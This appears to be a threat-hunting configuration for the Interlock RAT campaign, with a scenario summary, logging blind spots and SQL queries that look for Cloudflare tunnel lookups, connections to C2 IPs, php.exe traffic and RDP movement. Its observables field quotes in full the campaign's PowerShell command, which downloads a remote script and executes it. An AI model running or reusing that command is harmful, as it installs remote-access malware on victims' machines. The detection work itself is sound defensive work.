stages.name: Socially engineered clipboard execution
observables: powershell.exe -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\") | iex"

scenario.summary: The Interlock group uses KongTuke web-injects to deceive users into pasting malicious PowerShell commands from their clipboard into the Windows Run box. This command downloads and executes a PHP-based remote access trojan (RAT) that performs extensive local and Active Directory discovery before establishing persistence via registry keys and Command and Control through Cloudflare tunnels.

blind_spots.risk: Without process ownership, a connection to Cloudflare might be misattributed to legitimate software (e.g., a developer tool).
blind_spots.question: Which specific process initiated the connection to Cloudflare?
blind_spots.requires: hb_network_connection with process ownership on all workstations
blind_spots.remediation: Deploy endpoint agents with full socket tracking.

blind_spots.risk: If MFA was not recorded, we cannot confirm if credentials were stolen and reused without secondary verification.
blind_spots.question: Was MFA used for the suspicious RDP sessions?
blind_spots.remediation: Ensure MFA provider logs are correctly mapped to the OCSF auth schema.

hunt.name: Interlock RAT Network Tunneling and RDP Movement
hunt.description: This hunt focuses on the network-level persistence and movement phase of the Interlock RAT. It first identifies hosts communicating with Cloudflare Tunnels or hardcoded fallback IPs, then pivots to look for anomalous RDP logon patterns originating from those potential beachheads. By correlating legitimate service abuse (Cloudflare) with credential-based movement (RDP), the hunt identifies sessions that bypass standard binary-only detections.

config.content: SELECT device_hostname, query_hostname, process_name, COUNT(*) as query_count, MIN(time) as first_query, MAX(time) as last_query FROM hb_dns_activity WHERE (LOWER(query_hostname) LIKE '%.trycloudflare.com' OR instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, query_hostname, process_name
config.description: Identify hosts resolving Cloudflare Tunnel addresses used by the Interlock RAT.
config.expected_signal: A host resolving trycloudflare.com domains, particularly those matching the report's patterns. Silence indicates no active tunnel queries in the DNS logs.

primitive_config.label: C2 Tunnels via Cloudflare
primitive_config.content: SELECT device_hostname, query_hostname, process_name, COUNT(*) as query_count, MIN(time) as first_query, MAX(time) as last_query FROM hb_dns_activity WHERE (LOWER(query_hostname) LIKE '%.trycloudflare.com' OR instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, query_hostname, process_name
primitive_config.expected: A host resolving trycloudflare.com domains, particularly those matching the report's patterns. Silence indicates no active tunnel queries in the DNS logs.

config.content: SELECT device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name, COUNT(*) as connection_count, MIN(time) as first_conn FROM hb_network_connection WHERE (instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND state_kind = 'log' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name
config.description: Identify network connections to hardcoded C2 IPs that bypass DNS resolution.
config.expected_signal: Connections to 64.95.12.71 or 184.95.51.165. Silence indicates these specific fallback IPs were not contacted.

primitive_config.label: Direct Connections to C2 Fallbacks
primitive_config.content: SELECT device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name, COUNT(*) as connection_count, MIN(time) as first_conn FROM hb_network_connection WHERE (instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND state_kind = 'log' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name
primitive_config.expected: Connections to 64.95.12.71 or 184.95.51.165. Silence indicates these specific fallback IPs were not contacted.

config.content: SELECT src_endpoint_ip, dst_endpoint_name, actor_user_name, auth_protocol, status, COUNT(*) as login_count FROM hb_auth_signin WHERE (LOWER(auth_protocol) = 'rdp' OR LOWER(dst_endpoint_name) LIKE '%rdp%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || src_endpoint_ip || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY src_endpoint_ip, dst_endpoint_name, actor_user_name HAVING login_count < 10
config.description: Find RDP logons occurring on the estate that may represent lateral movement from suspicious hosts.
config.expected_signal: RDP sign-ins originating from or targeting hosts identified in the scoping steps. Rare user/source pairs stand out.

config.content: SELECT device_hostname, process_name, process_path, dst_endpoint_ip, dst_endpoint_port, time FROM hb_network_connection WHERE LOWER(process_name) LIKE '%php.exe%' AND (LOWER(dst_endpoint_ip) LIKE '64.95.12.%' OR LOWER(dst_endpoint_ip) LIKE '184.95.51.%' OR dst_endpoint_port IN (80, 443)) AND time >= datetime('now', '-{{lookback_days}} days')
config.description: Confirm if the C2 network activity is owned by the PHP executable described in the Interlock RAT campaign.
config.expected_signal: php.exe making external connections, which is abnormal for a standard workstation profile.
